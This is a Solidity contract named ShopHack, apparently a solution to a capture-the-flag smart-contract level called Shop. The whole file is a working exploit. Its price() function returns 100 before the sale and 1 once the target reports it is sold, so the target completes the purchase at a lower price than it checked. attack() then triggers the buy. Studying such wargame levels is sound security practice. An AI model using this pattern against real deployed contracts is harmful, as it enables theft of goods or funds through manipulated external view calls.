// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Shop {
    function isSold() external view returns (bool);
    function buy() external;
}

contract ShopHack {
    address public targetContract;

    constructor (address _targetContract) {
        targetContract = _targetContract;
    }

    function price() external view returns (uint256) {
        Shop shop = Shop(targetContract);
        if (shop.isSold()) {
            return 1;
        } else {
            return 100;
        }
    }

    function attack() external {
        Shop shop = Shop(targetContract);
        shop.buy();
    }
}
